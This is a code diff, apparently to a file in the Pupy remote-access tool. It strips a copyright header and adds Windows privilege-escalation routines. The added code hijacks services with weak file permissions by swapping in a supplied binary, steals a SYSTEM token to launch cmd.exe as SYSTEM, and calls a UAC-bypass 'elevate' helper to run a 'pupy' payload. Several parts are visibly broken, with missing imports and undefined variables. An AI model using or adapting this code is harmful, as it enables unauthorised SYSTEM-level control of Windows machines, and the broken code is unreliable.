@@ -1,70 +1,356 @@
 # -*- coding: UTF8 -*-
-# --------------------------------------------------------------
-# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
-# All rights reserved.
-# 
-# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
-# 
-# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
-# 
-# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
-# 
-# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
-# 
-# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
-# --------------------------------------------------------------
+
 from ctypes import *
+import subprocess
+import time
+import shutil
+import random
 
-LPVOID = c_void_p
-HANDLE	 = LPVOID
-INVALID_HANDLE_VALUE = c_void_p(-1).value
-DWORD = c_uint32
-LONG= c_long
 
-class LUID(Structure):
-	_fields_ = [
-		("LowPart",	 DWORD),
-		("HighPart",	LONG),
-	]
-class LUID_AND_ATTRIBUTES(Structure):
-	_fields_ = [
-		("Luid",		LUID),
-		("Attributes", DWORD),
-	]
+def AdminCheck():
+    try:
+        return os.getuid() == 0
+    except AttributeError:
+        return windll.shell32.IsUserAnAdmin() != 0
 
-class TOKEN_PRIVILEGES(Structure):
-	_fields_ = [
-		("PrivilegeCount", DWORD),
-		("Privileges",	 LUID_AND_ATTRIBUTES),
-	]
+def UACLevelCheck():
+	return windll.kernel32.WTSGetActiveConsoleSessionId()
 
-def EnablePrivilege(privilegeStr, hToken = None):
-	"""Enable Privilege on token, if no token is given the function gets the token of the current process."""
-	close=False
-	if hToken == None:
-		close=True
-		TOKEN_ADJUST_PRIVILEGES = 0x00000020
-		TOKEN_QUERY = 0x0008
-		hToken = HANDLE(INVALID_HANDLE_VALUE)
-		res=windll.advapi32.OpenProcessToken( windll.kernel32.GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), byref(hToken) )
-  
-	privilege_id = LUID()
-	res=windll.advapi32.LookupPrivilegeValueA(None, privilegeStr, byref(privilege_id))
+def ArchitectureCheck():
+	return platform.architecture()[0]
 
-	SE_PRIVILEGE_ENABLED = 0x00000002
-	laa = LUID_AND_ATTRIBUTES(privilege_id, SE_PRIVILEGE_ENABLED)
-	tp = TOKEN_PRIVILEGES(1, laa)
+#revised version of: https://github.com/heihachi/Coding-Projects/blob/master/Python/poly/xmulti_aeshell.py
+#doesnt depend on dropping any sort of file anymore
+#http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/
+def CheckWeakPrivs(temp_dir):
+	# attempt to search for weak permissions on applications
 
-	ERROR_NOT_ALL_ASSIGNED=1300
+	# array for possible matches
+	permatch = ['BUILTIN\\Users:(I)(F)','BUILTIN\\Users:(F)']
 
-	res=windll.advapi32.AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None)
-	if not res:
-		raise WinError()
-	else:
-		res=windll.kernel32.GetLastError()
-		if res!=0:
+	permbool = False
+ 
+	a = []
+	b = []
+
+	cmd = ["wmic.exe", "service", "list", "full"]
+	p = subprocess.Popen(cmd,
+						 stdout=subprocess.PIPE,
+						 stderr=subprocess.STDOUT)
+
+	for line in iter(p.stdout.readline, b''):
+		if ('PathName' in line) & ('system32' not in line):
+			a.append(line.strip('PathName=').rstrip())
+
+	ap = 0
+	bp = 0
+	weak_dir = []
+	weak_path = []
+	for i in range(0,len(a)):
+		cmd = ["cmd.exe", "/c", "icacls", a[i]]
+		p = subprocess.Popen(cmd,
+							 stdout=subprocess.PIPE,
+							 stderr=subprocess.STDOUT)
+
+		for line in iter(p.stdout.readline, b''):
+			cp = 0
+			while cp < len(permatch):
+				j = line.find(permatch[cp])
+				if j != -1:
+					# we found a misconfigured directory
+					if permbool == False:
+						permbool = True
+					bp = ap
+					while True:
+						if len(lines[bp].split('\\')) > 2:
+							while bp <= ap:
+								weak_dir.append(lines[bp])
+								bp += 1
+							exit()
+						else:
+							bp -= 1
+				cp += 1
+			ap += 1
+	if permbool == False:
+		return 'No directories with misconfigured premissions found.\n'
+	if permbool == True:
+		for i in range(0,len(weak_dir)):
+			weak_path.append(weak_dir[i].strip(permatch[0],permatch[1]))
+			i += 1
+
+		r = random.randint(0,len(weak_path))
+
+		if os.path.exists(weak_path[r]):
+			shutil.move(weak_path[r], weak_path[r]+'.bak')
+			shutil.move(temp_dir, weak_path[r])
+		cmd = ["wmic.exe", "service", weak_path[r], "call", "startservice"]
+		p = subprocess.Popen(cmd,
+							 stdout=subprocess.PIPE,
+							 stderr=subprocess.STDOUT)
+		return p.stdout.readline
+
+#https://github.com/joren485/PyWinPrivEsc/blob/master/RunAsSystem.py
+def RunAsSystem():
+	LPVOID = c_void_p
+	PVOID = LPVOID
+	PSID = PVOID
+	DWORD = c_uint32
+	LPSTR = c_char_p
+	HANDLE      = LPVOID
+	INVALID_HANDLE_VALUE = c_void_p(-1).value
+	LONG        = c_long
+	WORD        = c_uint16
+
+	READ_CONTROL                     = 0x00020000
+	STANDARD_RIGHTS_READ             = READ_CONTROL
+	STANDARD_RIGHTS_REQUIRED         = 0x000F0000
+
+	TOKEN_ASSIGN_PRIMARY    = 0x0001
+	TOKEN_DUPLICATE         = 0x0002
+	TOKEN_IMPERSONATE       = 0x0004
+	TOKEN_QUERY             = 0x0008
+	TOKEN_QUERY_SOURCE      = 0x0010
+	TOKEN_ADJUST_PRIVILEGES = 0x0020
+	TOKEN_ADJUST_GROUPS     = 0x0040
+	TOKEN_ADJUST_DEFAULT    = 0x0080
+	TOKEN_ADJUST_SESSIONID  = 0x0100
+	TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
+	tokenprivs  = (TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072 | 4))
+	TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
+			TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
+			TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
+			TOKEN_ADJUST_SESSIONID)
+
+	PROCESS_QUERY_INFORMATION = 0x0400
+
+	class LUID(Structure):
+		_fields_ = [
+			("LowPart",	 DWORD),
+			("HighPart",	LONG),
+		]
+		
+	class LUID_AND_ATTRIBUTES(Structure):
+		_fields_ = [
+			("Luid",		LUID),
+			("Attributes", DWORD),
+		]
+
+	class SID_AND_ATTRIBUTES(Structure):
+		_fields_ = [
+			('Sid',         PSID),
+			('Attributes',  DWORD),
+		]
+
+	class TOKEN_USER(Structure):
+		_fields_ = [
+			('User', SID_AND_ATTRIBUTES),]
+
+	class TOKEN_PRIVILEGES(Structure):
+		_fields_ = [
+			("PrivilegeCount", DWORD),
+			("Privileges",	 LUID_AND_ATTRIBUTES),
+		]
+
+	class PROCESS_INFORMATION(Structure):
+		_fields_ = [
+			('hProcess',    HANDLE),
+			('hThread',     HANDLE),
+			('dwProcessId', DWORD),
+			('dwThreadId',  DWORD),
+		]
+
+	class STARTUPINFO(Structure):
+		_fields_ = [
+			('cb',              DWORD),
+			('lpReserved',      LPSTR),
+			('lpDesktop',       LPSTR),
+			('lpTitle',         LPSTR),
+			('dwX',             DWORD),
+			('dwY',             DWORD),
+			('dwXSize',         DWORD),
+			('dwYSize',         DWORD),
+			('dwXCountChars',   DWORD),
+			('dwYCountChars',   DWORD),
+			('dwFillAttribute', DWORD),
+			('dwFlags',         DWORD),
+			('wShowWindow',     WORD),
+			('cbReserved2',     WORD),
+			('lpReserved2',     LPVOID),    # LPBYTE
+			('hStdInput',       HANDLE),
+			('hStdOutput',      HANDLE),
+			('hStdError',       HANDLE),
+		]
+
+	def EnablePrivilege(privilegeStr, hToken = None):
+		"""Enable Privilege on token, if no token is given the function gets the token of the current process."""
+		close=False
+		if hToken == None:
+			close=True
+			TOKEN_ADJUST_PRIVILEGES = 0x00000020
+			TOKEN_QUERY = 0x0008
+			hToken = HANDLE(INVALID_HANDLE_VALUE)
+			res=windll.advapi32.OpenProcessToken( windll.kernel32.GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), byref(hToken) )
+	  
+		privilege_id = LUID()
+		res=windll.advapi32.LookupPrivilegeValueA(None, privilegeStr, byref(privilege_id))
+
+		SE_PRIVILEGE_ENABLED = 0x00000002
+		laa = LUID_AND_ATTRIBUTES(privilege_id, SE_PRIVILEGE_ENABLED)
+		tp = TOKEN_PRIVILEGES(1, laa)
+
+		ERROR_NOT_ALL_ASSIGNED=1300
+
+		res=windll.advapi32.AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None)
+		if not res:
 			raise WinError()
-	if close:
-		windll.kernel32.CloseHandle(hToken)
+		else:
+			res=windll.kernel32.GetLastError()
+			if res!=0:
+				raise WinError()
+		if close:
+			windll.kernel32.CloseHandle(hToken)
 
+	def GetTokenSid(hToken):
+		"""Retrieve SID from Token"""
+		dwSize = DWORD(0)
+		pStringSid = LPSTR()
+		
+		TokenUser = 1
+		windll.advapi32.GetTokenInformation(hToken, TokenUser, byref(TOKEN_USER()), 0, byref(dwSize))
+									
+		address = windll.kernel32.LocalAlloc(0x0040, dwSize)
+		
+		windll.advapi32.GetTokenInformation(hToken, TokenUser, address, dwSize, byref(dwSize))
 
+		pToken_User = cast(address, POINTER(TOKEN_USER))
+
+		windll.advapi32.ConvertSidToStringSidA(pToken_User.contents.User.Sid, byref(pStringSid))
+		sid = pStringSid.value
+		
+		windll.kernel32.LocalFree(address)
+		return sid
+
+	def procids():
+		"""A list of every pid, sorted but first pids is winlogon.exe"""
+
+		count = 32
+		while True:
+			ProcessIds = (DWORD * count)()
+			cb = sizeof(ProcessIds)
+			BytesReturned = DWORD()
+			if windll.psapi.EnumProcesses( byref(ProcessIds), cb, byref(BytesReturned)):
+				if BytesReturned.value < cb:
+					break
+				else:
+					count *= 2
+
+		#winlogon_pid = 0
+		for index in range(int(BytesReturned.value/sizeof(DWORD))):
+			ProcessId = ProcessIds[index]
+			hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, ProcessId)
+			if hProcess:
+				ImageFileName = ( c_char * 260 )()
+				if windll.psapi.GetProcessImageFileNameA(hProcess, ImageFileName, 260) > 0:
+					filename = os.path.basename(ImageFileName.value)
+					if filename == 'winlogon.exe':
+						winlogon_pid = ProcessIds[index]
+				windll.kernel32.CloseHandle(hProcess)   
+
+		pids = [ProcessIds[index] for index in range(int(BytesReturned.value/sizeof(DWORD)))]
+		try:
+			pids.remove(winlogon_pid)
+			return [ winlogon_pid ] + pids
+		except:
+			return pids
+
+	def GetLocalSystemProcessToken():
+		"""Takes a list of pids and checks if the process has a token with SYSTEM user, if so it returns the token handle."""    
+		pids = procids()
+
+		for pid in pids:
+			try:
+				
+				hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
+
+				hToken = HANDLE(INVALID_HANDLE_VALUE)
+				windll.advapi32.OpenProcessToken(hProcess, tokenprivs, byref(hToken))
+
+				##If token SID is the SID of SYSTEM, return the token handle.
+				if GetTokenSid(hToken) == 'S-1-5-18':
+					print 'Using PID: ' + str(pid)
+					windll.kernel32.CloseHandle(hProcess)
+					return hToken
+
+				windll.kernel32.CloseHandle(hToken)
+				windll.kernel32.CloseHandle(hProcess)
+
+			except WindowsError:
+				print "[!] Error:" + str(e)
+
+	def GetUserName():
+		nSize = DWORD(0)
+		windll.advapi32.GetUserNameA(None, byref(nSize))
+		error = GetLastError()
+		
+		ERROR_INSUFFICIENT_BUFFER = 122
+		if error != ERROR_INSUFFICIENT_BUFFER:
+			raise WinError(error)
+		#lpBuffer = create_string_buffer('', nSize.value + 1)
+		lpBuffer = create_string_buffer(''.encode('UTF-8'),nSize.value + 1)
+		
+		success = windll.advapi32.GetUserNameA(lpBuffer, byref(nSize))
+		if not success:
+			raise WinError()
+
+		return lpBuffer.value.decode('UTF-8')
+
+	##Enable SE_DEBUG_NAME(debugprivileges) on the current process.
+	EnablePrivilege('SeDebugPrivilege')
+
+	##Get a SYSTEM user token.
+	hToken = GetLocalSystemProcessToken()
+
+	##Duplicate it to a Primary Token, so it can be passed to CreateProcess.
+	hTokendupe = HANDLE( INVALID_HANDLE_VALUE )
+
+	SecurityImpersonation = 2
+	TokenPrimary = 1
+	windll.advapi32.DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, None, SecurityImpersonation, TokenPrimary, byref( hTokendupe ) )
+
+	##Now we have duplicated the token, we can close the orginal.
+	windll.kernel32.CloseHandle(hToken)
+
+	##Enable SE_ASSIGNPRIMARYTOKEN_NAME and SE_INCREASE_QUOTA_NAME, these are both needed to start a process with a token.
+	EnablePrivilege( 'SeAssignPrimaryTokenPrivilege', hToken = hTokendupe )
+
+	EnablePrivilege( 'SeIncreaseQuotaPrivilege', hToken = hTokendupe )
+
+	##Enable SE_IMPERSONATE_NAME, so that we can impersonate the SYSTEM token.
+	EnablePrivilege('SeImpersonatePrivilege')
+
+	windll.advapi32.ImpersonateLoggedOnUser( hTokendupe )
+
+	##Start the process with the token.
+	try:
+		lpProcessInformation = PROCESS_INFORMATION()
+		lpStartupInfo = STARTUPINFO()
+		CREATE_NEW_CONSOLE = 0x00000010
+
+		windll.advapi32.CreateProcessAsUserA(hTokendupe, r'C:\Windows\System32\cmd.exe', None, None, None, True, CREATE_NEW_CONSOLE, None, None, byref(lpStartupInfo), byref(lpProcessInformation))
+	except WindowsError as e :
+		return 'Error:' + str(e)
+
+	#Clean up, revert back to self and close the handles
+	windll.advapi32.RevertToSelf()
+
+	windll.kernel32.CloseHandle(hTokendupe)
+
+def win_elevate(bypass,pupy):
+	cmd = [bypass, 'elevate', '/c', pupy]
+	try:
+		proc = subprocess.Popen([cmd],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		stdout, stderr = proc.communicate()
+	except WindowsError as e:
+		return 'STDERR:{}'.format(stderr)
+	else:
+		return 'STDOUT:{}'.format(stdout)
